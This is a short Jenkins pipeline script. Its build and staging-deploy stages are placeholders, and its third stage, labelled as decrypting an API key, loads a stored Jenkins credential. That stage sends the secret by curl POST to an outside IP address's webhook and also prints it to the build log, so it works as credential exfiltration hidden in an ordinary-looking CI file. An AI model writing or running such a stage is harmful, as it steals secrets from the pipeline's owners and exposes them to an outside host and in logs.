node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt API KEY') {
      withCredentials([string(credentialsId: '62c954f2-316e-4edf-89f3-9cf6d6cfb9bc',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.212.144.101:5000/webhook'
        '''
      }
      println apiKey
    }
}